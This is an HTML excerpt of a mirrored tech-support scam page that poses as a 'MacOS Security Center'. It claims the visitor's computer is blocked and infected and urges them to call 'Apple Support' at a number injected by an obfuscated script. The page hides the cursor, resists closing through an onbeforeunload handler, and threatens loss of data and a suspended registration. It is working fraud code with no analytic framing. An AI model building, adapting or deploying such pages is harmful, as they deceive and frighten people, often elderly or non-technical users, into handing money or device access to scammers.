...
<script async data-id="101490593" src="//static.getclicky.com/js"></script>
 ...
 <script>
        function cwewdwdewdwedwdwfwefcxcxcxsdsdwd(name)
        {
        ...
        var bcda = cwewdwdewdwedwdwfwefcxcxcxsdsdwd('bcda');
    </script>
  </head>
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
    ...
    <div class="pro_box_sadwdwdfwfa" style="cursor: none; display: block;">
    ...
    <div class="wecsdcsdsddkjiqwue" style="cursor: none; display: block;">
      <img src="bx1.png" alt="" style="max-width: 100%;width: 100%;margin: 0 auto;">
    </div>
    <div class="sdwqdqwfqqwewqrqw" style="cursor: none; display: block;">
      <div class="pro_box_header">
        <div class="row">
          <div class="col-md-12">
            <div class="minimize">
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            <span id="footertxt">
              <img src="msmm.png"> MacOS Security </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">Call Apple Support: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> +<script>document.write(bcda)</script>
              </span>
            </span>
          </div>
        </div>
        <div class="col-md-12">
          <marquee direction="left" height="100px" width="100%">
            <small class="text-left" style="color:#eee;font-size:10px">MacOS SmartScreen has prevented the display of an unrecognized application. Running this application may put your PC at risk. MacOS Scan has found a potentially unwanted adware on this device that could steal your passwords, your online identity, your financial information, your personal files, your photos or your documents.</small>
          </marquee>
        </div>
      </div>
    </div>
    <div class="lightbox" id="dwewfweqqquuu" style="display: block;">
      <div class="ilb top" style="font-size:17px">
        <div class="ilb headers" style="border-bottom:1px solid #d6d5d5">
          <span class="fl title" id="txtadd">
            ...
            </span>MacOS Security Center </span>
      ...
      <div id="txtintro">
        <span class="colo-rd">
          <div id="ip_add">Mac OS Firewall Alert !</div>
      ...
      <div id="disclaimer">Access to this PC has been blocked for security reasons.  <br>
        <span class="support" style="font-size:22px;">Call Apple Support:&nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> +<script>document.write(bcda)</script>
          </span>
        </span>
      </div>
      <div id="bottom">
        <img src="msmm.png" id="badge">
        <span class="title3">MacOS Security</span>
        <ul>
          <li>
            <a href="#">
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="qwwqwewqellkk">
      <p style="font-size:16px;font-weight:400;margin:0;margin-bottom:5px;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:8px" class="text-center">MacOS - Security Warning</p>
      <p>
      ...
      <p>MacOS Scan has found a potentially unwanted adware on this device that can steal your passwords, your online identity, your financial information, your personal files, your photos or your documents.</p>
      ...
      <p>By closing this window, you are putting your personal information at risk and you may have your MacOS registration suspended.</p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">You should contact us immediately so that our engineers can guide you through the removal process by phone. <br>Your computer is disabled.<br>
        <strong>Call Apple Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> +<script>document.write(bcda)</script>
          </span>
        </strong>
      </p>
    </div>
...
<!-- Mirrored from dsgsnbippyy.z13.web.core.windows.net/merrx01usahtml/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Aug 2025 18:13:57 GMT -->
</html>
